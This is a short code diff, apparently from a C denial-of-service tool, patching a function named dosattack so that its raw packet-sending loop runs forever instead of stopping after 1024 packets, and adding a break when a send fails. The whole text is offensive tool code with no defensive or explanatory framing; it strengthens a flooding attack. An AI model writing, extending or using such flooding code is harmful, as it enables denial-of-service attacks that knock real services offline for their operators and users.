@@ -164,8 +164,8 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     //Send the packet
     if (ptmp->MaxLoop == -1)
     {
-        int l;
-        for (l = 0; l < 1024; ++l)
+        //int l;
+        for (;;)
         {
             if (sendto(
                     socket_fd,               // our socket
@@ -176,6 +176,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
                     sizeof(sin)) < 0)        // a normal send()
             {
                 debug(debug_mode, 2, "Attack send error");
+                break;
             }
             // Data send successfully
             /*
